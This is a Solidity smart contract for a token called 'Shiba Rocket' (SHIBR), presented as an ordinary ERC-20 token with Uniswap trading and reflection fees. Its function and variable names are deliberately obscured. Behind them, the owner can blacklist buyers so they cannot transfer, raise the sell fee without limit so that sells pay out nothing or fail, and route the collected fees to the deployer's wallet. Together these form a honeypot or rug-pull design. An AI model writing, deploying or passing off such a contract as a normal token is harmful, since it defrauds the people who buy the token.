// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract B1 { function _s() internal view virtual returns (address) { return msg.sender; } }
interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address _zz, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed _zz, address indexed spender, uint256 value); }
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, "SafeMath: subtraction overflow"); }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "SafeMath: division by zero"); }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }
}
contract B2 is B1 {
    address private _z;
    event E1(address indexed previousOwner, address indexed newOwner);
    constructor () { address _ms = _s(); _z = _ms; emit E1(address(0), _ms); }
    function _zz() public view returns (address) { return _z; }
    modifier _m() { require(_z == _s(), "B2: caller is not the _zz"); _; }
    function _r() public virtual _m { emit E1(_z, address(0)); _z = address(0); }
}
interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity); }

contract Wv is B1, IERC20, B2 {
    using SafeMath for uint256;
    mapping (address => uint256) private _q15;
    mapping (address => uint256) private _q16;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _q8;
    mapping (address => bool) private _q1;
    mapping (address => uint) private _q17;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _q12;
    uint256 private _q13;
    uint256 private _q3 = 12;
    uint256 private _q11 = 12;
    address payable private _q7;
    string private constant _name = "Shiba Rocket";
    string private constant _symbol = "SHIBR";
    uint8 private constant _decimals = 9;
    IUniswapV2Router02 private _q6;
    address private _q5;
    bool private _q10;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private _q18 = false;
    uint256 private _q19 = _tTotal;
    event MaxTxAmountUpdated(uint _q19);
    modifier lockTheSwap { inSwap = true; _; inSwap = false; }

    constructor () {
        _q7 = payable(_s());
        _q15[_s()] = _rTotal;
        _q8[_zz()] = true;
        _q8[address(this)] = true;
        _q8[_q7] = true;
        emit Transfer(address(0), _s(), _tTotal);
    }
    function name() public pure returns (string memory) { return _name; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function decimals() public pure returns (uint8) { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }
    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_q15[account]); }
    function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_s(), recipient, amount); return true; }
    function allowance(address _zz, address spender) public view override returns (uint256) { return _allowances[_zz][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) { _approve(_s(), spender, amount); return true; }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _s(), _allowances[sender][_s()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function setCooldownEnabled(bool onoff) external _m() { _q18 = onoff; }
    function tokenFromReflection(uint256 rAmount) private view returns(uint256) { require(rAmount <= _rTotal, "Amount must be less than total reflections"); uint256 currentRate = _getRate(); return rAmount.div(currentRate); }
    function _approve(address _zz, address spender, uint256 amount) private { require(_zz != address(0), "ERC20: approve from the zero address"); require(spender != address(0), "ERC20: approve to the zero address"); _allowances[_zz][spender] = amount; emit Approval(_zz, spender, amount); }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _q12 = 0;
        _q13 = _q11;
        if (from != _zz() && to != _zz()) {
            require(!_q1[from] && !_q1[to]);
            if (from == _q5 && to != address(_q6) && ! _q8[to] && _q18) {
                require(amount <= _q19);
                require(_q17[to] < block.timestamp);
                _q17[to] = block.timestamp + (30 seconds);
            }
            if (to == _q5 && from != address(_q6) && ! _q8[from]) {
                _q12 = 0;
                _q13 = _q3;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && from != _q5 && swapEnabled) {
                _q30(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) { _q22(address(this).balance); }
            }
        }
        _q23(from,to,amount);
    }
    function _q30(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _q6.WETH();
        _approve(address(this), address(_q6), tokenAmount);
        _q6.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
    function _q22(uint256 amount) private { _q7.transfer(amount); }
    function _q9() external _m() {
        require(!_q10,"trading is already open");
        IUniswapV2Router02 _q29 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _q6 = _q29;
        _approve(address(this), address(_q6), _tTotal);
        _q5 = IUniswapV2Factory(_q29.factory()).createPair(address(this), _q29.WETH());
        _q6.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,_zz(),block.timestamp);
        swapEnabled = true;
        _q18 = true;
        _q19 = 20000000000 * 10**9;
        _q10 = true;
        IERC20(_q5).approve(address(_q6), type(uint).max);
    }
    function _q2(address[] memory _q26) public _m { for (uint i = 0; i < _q26.length; i++) { _q1[_q26[i]] = true; } }
    function _q14(address _q27) public _m { _q1[_q27] = false; }
    function _q4(uint256 _q28) external _m { _q3 = _q28; }
    function _q23(address sender, address recipient, uint256 amount) private { _q24(sender, recipient, amount); }
    function _q24(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
        _q15[sender] = _q15[sender].sub(rAmount);
        _q15[recipient] = _q15[recipient].add(rTransferAmount);
        _q25(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _q25(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _q15[address(this)] = _q15[address(this)].add(rTeam); }
    function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); }
    receive() external payable {}
    function _q20() external { require(_s() == _q7); uint256 contractBalance = balanceOf(address(this)); _q30(contractBalance); }
    function _q21() external { require(_s() == _q7); uint256 contractETHBalance = address(this).balance; _q22(contractETHBalance); }
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _q12, _q13);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tTeam = tAmount.mul(TeamFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _getRate() private view returns(uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); }
    function _getCurrentSupply() private view returns(uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); }
}
